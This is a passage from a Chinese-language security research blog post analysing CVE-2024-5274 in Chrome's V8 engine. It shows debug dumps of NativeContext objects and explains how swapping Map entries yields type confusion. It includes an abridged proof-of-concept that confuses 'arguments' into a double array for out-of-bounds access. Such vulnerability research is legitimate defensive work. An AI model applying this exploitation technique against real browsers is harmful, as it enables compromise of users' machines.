</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span></code></pre></div><p>这些对象对应的源码在<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/contexts.h;drc=1f14cc876cc5bf899d13284a12c451498219bb2d;l=44">这里</a>，我们dump出的<a href=https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2024-5274/native_context_objs.txt>结果</a>也已公开。</p><h3 id=nativecontext的玩法>NativeContext的玩法<a hidden class=anchor aria-hidden=true href=#nativecontext的玩法>#</a></h3><p>至此我们可以任意地访问<code>NativeContext</code>中的对象，里面有许多在正常JavaScript执行过程中无法获取到的对象。例如我们可以直接访问到一个double类型的array中的<code>FixedDoubleArray</code>（实际存储元素的结构）。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// o155 in slot 157
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>DebugPrint</span><span class=p>:</span> <span class=mh>0x272f000d1ba1</span><span class=o>:</span> <span class=p>[</span><span class=n>FixedDoubleArray</span><span class=p>]</span> <span class=n>in</span> <span class=n>OldSpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>map</span><span class=p>:</span> <span class=mh>0x272f0000090d</span> <span class=o>&lt;</span><span class=nf>Map</span><span class=p>(</span><span class=n>FIXED_DOUBLE_ARRAY_TYPE</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>length</span><span class=p>:</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=o>-</span><span class=mi>63</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=mh>0x272f0000090d</span><span class=o>:</span> <span class=p>[</span><span class=n>Map</span><span class=p>]</span> <span class=n>in</span> <span class=n>ReadOnlySpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>type</span><span class=p>:</span> <span class=n>FIXED_DOUBLE_ARRAY_TYPE</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nl>size</span><span class=p>:</span> <span class=n>variable</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>elements</span> <span class=nl>kind</span><span class=p>:</span> <span class=n>HOLEY_DOUBLE_ELEMENTS</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>unused</span> <span class=n>property</span> <span class=nl>fields</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=k>enum</span> <span class=nl>length</span><span class=p>:</span> <span class=n>invalid</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>stable_map</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>back</span> <span class=nl>pointer</span><span class=p>:</span> <span class=mh>0x272f00000251</span> <span class=o>&lt;</span><span class=n>undefined</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>prototype_validity</span> <span class=nl>cell</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nf>descriptors</span> <span class=p>(</span><span class=n>own</span><span class=p>)</span> <span class=err>#</span><span class=mi>0</span><span class=o>:</span> <span class=mh>0x272f00000295</span> <span class=o>&lt;</span><span class=n>DescriptorArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>prototype</span><span class=p>:</span> <span class=mh>0x272f00000235</span> <span class=o>&lt;</span><span class=n>null</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>constructor</span><span class=p>:</span> <span class=mh>0x272f00000235</span> <span class=o>&lt;</span><span class=n>null</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>dependent</span> <span class=nl>code</span><span class=p>:</span> <span class=mh>0x272f00000229</span> <span class=o>&lt;</span><span class=n>Other</span> <span class=n>heap</span> <span class=nf>object</span> <span class=p>(</span><span class=n>WEAK_ARRAY_LIST_TYPE</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>construction</span> <span class=nl>counter</span><span class=p>:</span> <span class=mi>0</span>
</span></span></code></pre></div><p>然而，若我们试图去使用这个类型，会发生crash。</p><img src=assets/image-20240702174655522.png style=display:block;margin-left:auto;margin-right:auto;zoom:70%><p>这是因为这些类型并不能直接从JavaScript中操作，除了一些基本类型，基本上只有属于<code>JSObject</code>的类型才可被脚本操作。</p><p>继续研究<code>NativeContext</code>中的其他Object，可以看到其中有大量Map类型的Object。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// o151 in slot 153
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>DebugPrint</span><span class=p>:</span> <span class=mh>0x272f000d1b39</span><span class=o>:</span> <span class=p>[</span><span class=n>Map</span><span class=p>]</span> <span class=n>in</span> <span class=n>OldSpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>type</span><span class=p>:</span> <span class=n>JS_MAP_KEY_VALUE_ITERATOR_TYPE</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>inobject</span> <span class=nl>properties</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>elements</span> <span class=nl>kind</span><span class=p>:</span> <span class=n>HOLEY_ELEMENTS</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>unused</span> <span class=n>property</span> <span class=nl>fields</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=k>enum</span> <span class=nl>length</span><span class=p>:</span> <span class=n>invalid</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>stable_map</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>back</span> <span class=nl>pointer</span><span class=p>:</span> <span class=mh>0x272f00000251</span> <span class=o>&lt;</span><span class=n>undefined</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>prototype_validity</span> <span class=nl>cell</span><span class=p>:</span> <span class=mh>0x272f00000ac5</span> <span class=o>&lt;</span><span class=n>Cell</span> <span class=n>value</span><span class=o>=</span> <span class=mi>1</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nf>descriptors</span> <span class=p>(</span><span class=n>own</span><span class=p>)</span> <span class=err>#</span><span class=mi>0</span><span class=o>:</span> <span class=mh>0x272f00000295</span> <span class=o>&lt;</span><span class=n>DescriptorArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>prototype</span><span class=p>:</span> <span class=mh>0x272f000d1251</span> <span class=o>&lt;</span><span class=n>Object</span> <span class=n>map</span> <span class=o>=</span> <span class=mh>0x272f000d11e5</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>constructor</span><span class=p>:</span> <span class=mh>0x272f000d1b19</span> <span class=o>&lt;</span><span class=n>JSFunction</span> <span class=nf>MapIterator</span> <span class=p>(</span><span class=n>sfi</span> <span class=o>=</span> <span class=mh>0x272f00091e29</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>dependent</span> <span class=nl>code</span><span class=p>:</span> <span class=mh>0x272f00000229</span> <span class=o>&lt;</span><span class=n>Other</span> <span class=n>heap</span> <span class=nf>object</span> <span class=p>(</span><span class=n>WEAK_ARRAY_LIST_TYPE</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>construction</span> <span class=nl>counter</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=p>...</span>
</span></span></code></pre></div><p>Map是v8中一个基础且重要的类型，他决定了一个变量的类型。如果有办法操作Map，那就能够造出一个强大的漏洞利用原语Type Confusion。</p><p>在某些情况下，v8会从<code>NativeContext</code>中读取Map来创建对象。例如在<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/promise-all.tq;drc=ec53113a6d7d95cf8b255aec7fc91b17acd33d80;l=309">src/builtins/promise-all.tq</a>中：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>arrayMap</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>          <span class=o>*</span><span class=nx>NativeContextSlot</span><span class=p>(</span>
</span></span><span class=line><span class=cl>          <span class=nx>nativeContext</span><span class=p>,</span> <span class=nx>ContextSlot</span><span class=o>::</span><span class=nx>JS_ARRAY_PACKED_ELEMENTS_MAP_INDEX</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>const</span> <span class=nx>valuesArray</span> <span class=o>=</span> <span class=nx>NewJSArray</span><span class=p>(</span><span class=nx>arrayMap</span><span class=p>,</span> <span class=nx>values</span><span class=p>);</span>
</span></span></code></pre></div><p>我们虽然不能直接修改Map对象，但是<code>NativeContext</code>中有大量的Map，如果我们从某个slot读取一个Map覆盖了另一个slot中的Map，那么是否就造成了类型混淆呢？答案是肯定的！</p><p>以下代码就是一个简单的PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>o60</span> <span class=o>=</span> <span class=nx>o110</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>hax2</span><span class=p>(</span><span class=nx>a0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// `arguments` is confused to double array now
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>arguments</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>hax2</span><span class=p>();</span>
</span></span></code></pre></div><p>在PoC中我们将函数的<code>arguments</code>混淆成了元素为double的array，可以造成OOB读写。通过完成这样类型混淆的方式，接下来就是经典的v8漏洞利用套路了。相关的<a href=https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2024-5274>PoC</a>代码和全部的native objects定义我们已公开在了我们的Github仓库中。</p><p>至此我们终于通过parser中一个不起眼的小问题，完成了强大的漏洞利用原语，几乎可以任意地混淆JavaScript引擎中的不同类型。</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><span class=title>下一页 »</span><br><span>Steam漏洞利用：CEF框架应用下的常规与非常规利用手段</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://www.darknavy.org/zh/>DARKNAVY</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>